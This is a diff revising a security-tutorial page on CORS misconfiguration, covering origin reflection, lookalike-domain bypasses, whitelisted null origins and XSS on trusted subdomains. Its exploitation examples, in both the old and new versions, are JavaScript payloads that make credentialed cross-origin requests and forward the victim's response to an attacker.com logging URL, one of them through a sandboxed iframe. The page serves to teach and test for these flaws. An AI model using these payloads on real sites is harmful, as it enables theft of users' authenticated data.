@@ -1,83 +1,124 @@
 ---
-title: "CORS"
+title: "CORS Misconfiguration"
 weight: 7
-description: "Learn how misconfigured CORS policies expose sensitive data via origin reflection, null whitelisting, and XSS on trusted subdomains."
+description: "Learn how misconfigured CORS policies can expose sensitive data through origin reflection, null origin whitelisting, and XSS on trusted subdomains."
 ---
 
 # CORS
 
-**Impact**: if a response contains any sensitive information such as an API key or CSRF token, you could retrieve these info.
+**Impact**: If a web response includes sensitive data (like an API key or CSRF token), and CORS is misconfigured, an attacker could steal that data using a malicious website.
 
-## Server ACAO Header from Client-Origin
+## What is CORS?
 
-Some app read the Origin header from requests and including a response header stating that the requesting origin is allowed.
+CORS (Cross-Origin Resource Sharing) is a browser security feature that controls how web applications interact with resources hosted on different origins. It's designed to prevent malicious websites from making unauthorized requests to other sites on behalf of the user.
 
-**Detection**&#x20;
+{{< hint style=notes >}}
+**Note**: An "origin" in CORS includes the protocol, domain, and port. So `https://example.com` and `http://example.com` are considered different origins
+\[[🔗](https://developer.mozilla.org/en-US/docs/Glossary/Origin)].
+{{< /hint >}}
 
-Send request with `Origin: https://example.com` and see if the origin is reflected in the `Access-Control-Allow-Origin` header.
+## Origin Reflection in ACAO Header
 
-**Exploit**
+Some vulnerable servers reflect the `Origin` header in the `Access-Control-Allow-Origin` response without validating it.
+
+**How to Detect**
+
+Send a request with a custom `Origin` header (e.g., `Origin: https://evil.com`) and check if the same origin is reflected back.
+
+```http
+Access-Control-Allow-Origin: https://evil.com
+```
+
+{{< hint style=warning >}}
+**Warning**: If `Access-Control-Allow-Credentials: true` is also present, an attacker can send authenticated requests from a malicious origin.
+{{< /hint >}}
+
+**Exploitation Example**
 
 ```html
 <script>
-var req = new XMLHttpRequest();
-req.onload = reqListener;
-req.open('get','https://vulnerable-website.com/sensitive-victim-data',true);
-req.withCredentials = true;
-req.send();
-
-function reqListener() {
-	location='https://attacker.com/log?key='+this.responseText;
-};
+  var req = new XMLHttpRequest();
+  req.onload = function () {
+    location = 'https://attacker.com/log?data=' + this.responseText;
+  };
+  req.open('GET', 'https://vulnerable-website.com/secret-data', true);
+  req.withCredentials = true;
+  req.send();
 </script>
 ```
 
-## Errors parsing Origin headers
+## Bypassing Origin Checks with Similar Domains
 
-Suppose `normal-website.com`. Bypass with`hackersnormal-website.com` or `normal-website.com.evil-user.net`
+Some applications whitelist trusted origins without strict validation, making it possible to bypass checks using similar-looking domains.
+
+**Examples**:
+
+- `hackersnormal-website.com`
+- `normal-website.com.attacker.com`
 
 {{< hint style=notes >}}
-**Note**: you need to know the whitelisted origins.
+**Note**: You need to know or guess the whitelisted origins to attempt this.
 {{< /hint >}}
 
-## Whitelisted null origin value
+## Whitelisted `null` Origin
 
-**Detection**
+If the server allows `null` as an origin, it may be vulnerable to data theft through sandboxed iframes.
 
-Send request with `Origin: null` and see if the response has `Access-Control-Allow-Origin: null`
+**How to Detect**
 
-**Exploit**
+Send a request with:
+
+```http
+Origin: null
+```
+
+and check for:
+
+```http
+Access-Control-Allow-Origin: null
+```
+
+**Exploitation Example**
 
 ```html
-<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
-var req = new XMLHttpRequest();
-req.onload = reqListener;
-req.open('get','https://vulnerable-website.com/sensitive-victim-data',true);
-req.withCredentials = true;
-req.send();
-
-function reqListener() {
-location='https://attacker.com/log?key='+this.responseText;
-};
+<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,
+<script>
+  var req = new XMLHttpRequest();
+  req.onload = function () {
+    location = 'https://attacker.com/log?data=' + this.responseText;
+  };
+  req.open('GET', 'https://vulnerable-website.com/secret-data', true);
+  req.withCredentials = true;
+  req.send();
 </script>"></iframe>
 ```
 
-## Exploiting XSS via CORS trust relationships
+## Using XSS on a Trusted Subdomain to Exploit CORS
 
-Suppose that:
+If a site allows CORS requests only from a trusted subdomain and you find an XSS vulnerability on that subdomain, you can use the XSS to steal data via CORS.
+
+**Example Response:**
 
 ```http
-HTTP/1.1 200 OK
-Access-Control-Allow-Origin: https://subdomain.vulnerable-website.com
+Access-Control-Allow-Origin: https://sub.vulnerable.com
 Access-Control-Allow-Credentials: true
 ```
 
-If you find an XSS on `subdomain.vulnerable-website.com` inject JavaScript that uses CORS and retrieve information.
+**Exploitation Flow:**
 
-```sh
-https://subdomain.vulnerable-website.com/?xss=<script>cors-stuff-here</script>
+1. Find XSS on `https://sub.vulnerable.com`.
+2. Inject malicious script that performs a CORS request to the main domain.
+3. Steal the sensitive response.
+
+URL:
+```md
+https://sub.vulnerable.com/?xss=<script>...your-code...</script>
 ```
 
-## Cookie SameSite
 
-It is important to note that all this works in according with SameSite cookie attribute. This means that if your session cookie is set with `SameSite=Strict` the browser send the cookie only for same-site requests. For more information about this topic and how to bypass it, refer to [#samesite-cookies](csrf-cross-site-request-forgery.md#samesite-cookies "mention").
+## The Role of SameSite Cookies
+
+CORS exploits often rely on the browser sending cookies along with cross-origin requests. This depends on the `SameSite` attribute of the cookie.
+To exploit CORS with `withCredentials=true`, the session cookie must be accessible (i.e., not blocked by `SameSite=Strict`).
+
+Learn more in the dedicated section on [SameSite Cookies]({{< ref "web/vulnerabilities/csrf" >}}).
